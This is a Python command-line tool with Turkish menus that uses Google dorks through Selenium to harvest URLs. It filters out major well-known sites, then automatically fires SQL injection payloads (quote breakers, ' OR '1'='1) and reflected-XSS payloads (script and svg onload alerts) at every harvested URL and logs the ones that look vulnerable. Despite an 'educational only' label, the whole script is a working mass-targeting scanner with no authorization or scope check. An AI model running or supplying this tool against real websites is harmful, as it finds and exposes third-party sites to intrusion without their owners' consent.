import os
import requests
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import time
import sys
from urllib.parse import urlparse

ENGELLI_URL_DOSYASI = "engellenen_urller.txt"

ONERILEN_SITELER = [
    "stackoverflow.com",
    "reddit.com",
    "github.com",
    "gitlab.com",
    "bitbucket.org",
    "medium.com",
    "wikipedia.org",
    "wikimedia.org",
    "twitter.com",
    "linkedin.com",
    "facebook.com",
    "instagram.com",
    "youtube.com",
    "vimeo.com",
    "google.com",
    "bing.com",
    "yahoo.com",
    "duckduckgo.com",
    "amazon.com",
    "ebay.com",
    "etsy.com",
    "paypal.com",
    "apple.com",
    "microsoft.com",
    "mozilla.org",
    "adobe.com",
    "netflix.com",
    "spotify.com",
    "dropbox.com",
    "salesforce.com",
    "slack.com",
    "zoom.us",
    "cloudflare.com",
    "akamai.com",
    "heroku.com",
    "wordpress.com",
    "blogspot.com",
    "tumblr.com",
    "quora.com",
    "disqus.com",
    "soundcloud.com",
    "behance.net",
    "dribbble.com",
    "flickr.com",
    "imdb.com",
    "tripadvisor.com",
    "airbnb.com",
    "uber.com",
    "craigslist.org",
    "yelp.com",
    "booking.com"
]

# Renkler
class Color:
    RED = '\033[91m'
    YELLOW = '\033[93m'
    END = '\033[0m'

def dosya_olustur(dosya_adi):
    if not os.path.exists(dosya_adi):
        with open(dosya_adi, 'w', encoding='utf-8') as f:
            pass
        print(f"'{dosya_adi}' dosyası oluşturuldu.")

def banner():
    print(Color.RED + r"""
                                    .__             .___            __     
_____    ______ ___________    _____|__| ____     __| _/___________|  | __ 
\__  \  /  ___//  ___/\__  \  /  ___/  |/    \   / __ |/  _ \_  __ \  |/ /
 / __ \_\___ \ \___ \  / __ \_\___ \|  |   |  \ / /_/ (  <_> )  | \/    <
(____  /____  >____  >(____  /____  >__|___|  / \____ |\____/|__|  |__|_ \
     \/     \/     \/      \/     \/        \/       \/                 \/
""" + Color.END)
    print(Color.YELLOW + "                 Creator: fy9 - Sadece eğitim amaçlıdır.\n" + Color.END)

def menu():
    banner()
    print("Yapmak istediğiniz işlemi seçiniz:\n")
    print("1 - Dork Tarama")
    print("2 - SQL Injection Zafiyet Taraması")
    print("3 - XSS Zafiyet Taraması")
    print("4 - URL Engelleme (Önerilen + Manuel)")
    print("0 - Çıkış\n")

    secim = input("Seçiminiz: ").strip()
    return secim

def captcha_var_mi(driver):
    page_source = driver.page_source.lower()
    return "captcha" in page_source or "verify you are not a robot" in page_source or "sorry" in page_source

def domain_engellenmeli_mi(url, engelli_url_listesi):
    try:
        domain = urlparse(url).netloc.lower()
        for engelli_site in engelli_url_listesi:
            if engelli_site in domain:
                return True
        return False
    except:
        return False

def dork_tarayici_selenium(dork_listesi, cikti_dosyasi, toplam_sonuc_adedi, engelleme_aktif_mi=False):
    if engelleme_aktif_mi:
        try:
            with open(ENGELLI_URL_DOSYASI, 'r', encoding='utf-8') as f:
                engelli_url_listesi = [line.strip().lower() for line in f if line.strip()]
        except FileNotFoundError:
            engelli_url_listesi = []
    else:
        engelli_url_listesi = []

    options = Options()
    options.headless = False
    options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36")
    driver = webdriver.Chrome(options=options)

    with open(dork_listesi, 'r', encoding='utf-8') as dork_file, \
         open(cikti_dosyasi, 'w', encoding='utf-8') as cikti_file:

        dork_satirlari = [d.strip() for d in dork_file.read().splitlines() if d.strip()]
        dork_sayisi = len(dork_satirlari)

        if dork_sayisi == 0:
            print("Dork listesi boş.")
            return

        temel_sayi = toplam_sonuc_adedi // dork_sayisi
        kalan = toplam_sonuc_adedi % dork_sayisi

        sonuc_dagilimi = [temel_sayi + (1 if i < kalan else 0) for i in range(dork_sayisi)]

        for i, (dork, hedef_link_sayisi) in enumerate(zip(dork_satirlari, sonuc_dagilimi)):
            print(f"[{i+1}/{len(dork_satirlari)}] Aranıyor: {dork} | Hedef: {hedef_link_sayisi} link")

            driver.get(f"https://www.google.com/search?q={dork}")
            time.sleep(3)

            if captcha_var_mi(driver):
                print("CAPTCHA tespit edildi. Tarayıcıda çözün.")
                input("CAPTCHA'yı çözdüyseniz ENTER'a basın...")

            toplanan = 0
            while toplanan < hedef_link_sayisi:
                results = driver.find_elements(By.CSS_SELECTOR, 'div.tF2Cxc')

                if not results:
                    print("-> Sonuç bulunamadı veya daha fazla yok.")
                    break

                for sonuc in results:
                    if toplanan >= hedef_link_sayisi:
                        break
                    try:
                        link = sonuc.find_element(By.TAG_NAME, 'a').get_attribute('href')
                        if engelleme_aktif_mi:
                            if domain_engellenmeli_mi(link, engelli_url_listesi):
                                print(f"Engellenen site veya önerilen site, atlanıyor: {link}")
                                continue
                        cikti_file.write(f"{link}\n")
                        toplanan += 1
                    except:
                        continue

                print(f"-> {toplanan}/{hedef_link_sayisi} link toplandı.")

                try:
                    next_button = driver.find_element(By.ID, "pnnext")
                    next_button.click()
                    time.sleep(3)

                    if captcha_var_mi(driver):
                        print("CAPTCHA tespit edildi.")
                        input("CAPTCHA'yı çözdüyseniz ENTER'a basın...")
                except:
                    print("-> Daha fazla sayfa yok.")
                    break

            print(f"{dork} için tamamlandı. Toplam: {toplanan} link.\n")

    driver.quit()
    print(f"\nTüm tarama tamamlandı. Sonuçlar: {cikti_dosyasi}")

def url_engelleme_menu():
    print("\nURL Engelleme Menüsü\n")
    print("1 - Önerilen Siteleri Engelle")
    print("2 - Manuel URL Engelleme")
    print("3 - Engellemeleri Sil")
    print("0 - Çıkış\n")

    while True:
        secim = input("Seçiminiz: ").strip()

        if secim == "0":
            print("URL engelleme menüsünden çıkılıyor.\n")
            break

        elif secim == "1":
            print("Önerilen siteler engelleniyor...")
            try:
                mevcut_engelliler = set()
                try:
                    with open(ENGELLI_URL_DOSYASI, 'r', encoding='utf-8') as f2:
                        for line in f2:
                            mevcut_engelliler.add(line.strip().lower())
                except FileNotFoundError:
                    pass

                eklenen = 0
                with open(ENGELLI_URL_DOSYASI, 'a', encoding='utf-8') as f:
                    for site in ONERILEN_SITELER:
                        if site.lower() not in mevcut_engelliler:
                            f.write(site + "\n")
                            eklenen += 1

                print(f"{eklenen} önerilen site engellendi ve '{ENGELLI_URL_DOSYASI}' dosyasına eklendi.")
            except Exception as e:
                print(f"Hata oluştu: {e}")

        elif secim == "2":
            url_giris = input("Engellenecek URL veya domain girin (Çıkmak için 0 yazın): ").strip().lower()
            if not url_giris:
                print("Boş değer geçilemez.")
                continue

            mevcut = set()
            try:
                with open(ENGELLI_URL_DOSYASI, 'r', encoding='utf-8') as f:
                    for line in f:
                        mevcut.add(line.strip().lower())
            except FileNotFoundError:
                pass

            if url_giris in mevcut:
                print("Bu URL/domain zaten engelli listesinde.")
            else:
                try:
                    with open(ENGELLI_URL_DOSYASI, 'a', encoding='utf-8') as f:
                        f.write(url_giris + "\n")
                    print(f"'{url_giris}' engelli listesine eklendi.")
                except Exception as e:
                    print(f"Eklenirken hata oluştu: {e}")

        elif secim == "3":
            try:
                open(ENGELLI_URL_DOSYASI, 'w').close()
                print("Tüm engellemeler silindi.\n")
            except Exception as e:
                print(f"Hata: Engellemeler silinemedi: {e}")
        else:
            print("Geçersiz seçim, lütfen tekrar deneyin.\n")

def sql_injection_tarama(url_dosyasi):
    try:
        with open(url_dosyasi, 'r', encoding='utf-8') as f:
            urller = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Hata: '{url_dosyasi}' dosyası bulunamadı.")
        return

    kayit_dosyasi = input("SQL Injection açıklarının kaydedileceği dosya adı (örn: sqli_aciklar.txt): ").strip()
    if not kayit_dosyasi:
        print("Geçerli bir dosya adı girilmedi. İşlem iptal edildi.")
        return

    print(f"{len(urller)} URL taranıyor (SQL Injection test)...")

    payloadlar = ["'", '"', "'--", '"--', "')", '")', "' OR '1'='1", '" OR "1"="1"']
    hata_sayisi = {}
    acik_urller = set()

    for url in urller:
        hata_sayisi[url] = 0  # Her URL için hata sayacı

    for url in urller:
        if hata_sayisi[url] >= 2:
            print(f"[!] {url} üzerinde çok hata alındığı için atlanıyor.")
            continue

        for payload in payloadlar:
            test_url = url + payload
            try:
                r = requests.get(test_url, timeout=5)
                hatalar = ["mysql", "syntax error", "sql", "odbc", "oracle", "unclosed quotation mark"]
                if any(hata.lower() in r.text.lower() for hata in hatalar):
                    print(f"[VULNERABLE SQLi] {test_url}")
                    acik_urller.add(url)
                    break
            except requests.RequestException:
                hata_sayisi[url] += 1
                if hata_sayisi[url] >= 2:
                    print(f"[!] {url} üzerinde çok hata alındığı için atlanıyor.")
                    break

    if acik_urller:
        with open(kayit_dosyasi, 'w', encoding='utf-8') as f:
            for u in acik_urller:
                f.write(u + "\n")
        print(f"SQL Injection açıkları '{kayit_dosyasi}' dosyasına kaydedildi.")
    else:
        print("SQL Injection açığı bulunamadı.")

import requests

def xss_tarama(url_dosyasi):
    payloads = [
        "<script>alert(1)</script>",
        "\"'><script>alert(1)</script>",
        "'\"><img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "'\"><svg/onload=alert(1)>"
    ]

    print(f"\nXSS taraması başlıyor: {url_dosyasi}")

    try:
        with open(url_dosyasi, 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Hata: Dosya okunamadı: {e}")
        return

    kaydetme = input("XSS açığı bulunan URL'leri kaydetmek ister misiniz? (E/H): ").strip().lower()
    kayit_dosyasi = None
    if kaydetme == 'e':
        kayit_dosyasi = input("Kaydedilecek dosya adı (ör: xss_aciklar.txt): ").strip()
        try:
            kayit_dosyasi_handle = open(kayit_dosyasi, 'w', encoding='utf-8')
        except Exception as e:
            print(f"Dosya açılamadı: {e}")
            kayit_dosyasi_handle = None
            kayit_dosyasi = None
    else:
        kayit_dosyasi_handle = None

    for url in urls:
        print(f"\n{url} için test yapılıyor...")
        vulnerable = False
        hata_sayisi = 0

        for payload in payloads:
            if hata_sayisi >= 2:
                print("-> Çok sayıda hata alındı, bu URL için test iptal edildi.")
                break

            if "?" not in url:
                print("-> URL parametre içermiyor, atlanıyor.")
                break

            test_url = url + payload

            try:
                response = requests.get(test_url, timeout=10)
                content = response.text.lower()
                # Payloadun sayfada geçtiğini görmek temel test:
                if payload.lower() in content:
                    print(f"-> POTANSİYEL XSS AÇIĞI bulundu! Payload: {payload}")
                    vulnerable = True
                    break
            except Exception as e:
                hata_sayisi += 1
                print(f"-> İstek yapılırken hata ({hata_sayisi}.): {e}")
                if hata_sayisi >= 2:
                    print("-> Çok sayıda hata nedeniyle bu URL atlanıyor.")
                    break

        if vulnerable:
            print("-> Açık bulundu!")
            if kayit_dosyasi_handle:
                kayit_dosyasi_handle.write(url + "\n")
        elif hata_sayisi < 2:
            print("-> Potansiyel açık bulunamadı.")

    if kayit_dosyasi_handle:
        kayit_dosyasi_handle.close()
        print(f"\nAçık bulunan URL'ler {kayit_dosyasi} dosyasına kaydedildi.")

    print("\nXSS taraması tamamlandı.")


if __name__ == "__main__":
    dosya_olustur(ENGELLI_URL_DOSYASI)
    while True:
        secim = menu()
        if secim == "1":
            print("\nDork tarama işlemi seçildi.")
            dorkfile = input("Dork listesinin dosya adı (ör: dorklar.txt): ").strip()
            savefile = input("Sonuçların kaydedileceği dosya adı (ör: cikti.txt): ").strip()
            while True:
                try:
                    results = int(input("Toplam alınacak sonuç sayısı: "))
                    if results <= 0:
                        print("Pozitif bir sayı giriniz.")
                        continue
                    break
                except ValueError:
                    print("Lütfen geçerli bir sayı girin.")

            engelleme_secim = input("Engellemeleri aktif etmek ister misiniz? (E/H): ").strip().lower()
            engelleme_aktif = (engelleme_secim == 'e')

            dork_tarayici_selenium(dorkfile, savefile, results, engelleme_aktif_mi=engelleme_aktif)

            input("\nAna menüye dönmek için ENTER'a basın...")

        elif secim == "2":
            print("\nSQL Injection Zafiyet Taraması seçildi.")
            urlfile = input("Tarama yapılacak URL’lerin olduğu dosya adı (ör: cikti.txt): ").strip()
            sql_injection_tarama(urlfile)
            input("\nAna menüye dönmek için ENTER'a basın...")

        elif secim == "3":
            print("\nXSS Zafiyet Taraması seçildi.")
            urlfile = input("Tarama yapılacak URL’lerin olduğu dosya adı (ör: cikti.txt): ").strip()
            xss_tarama(urlfile)
            input("\nAna menüye dönmek için ENTER'a basın...")

        elif secim == "4":
            url_engelleme_menu()

        elif secim == "0":
            print("Çıkış yapılıyor. İyi günler!")
            sys.exit()

        else:
            print("Geçersiz seçim. Lütfen tekrar deneyin.\n")
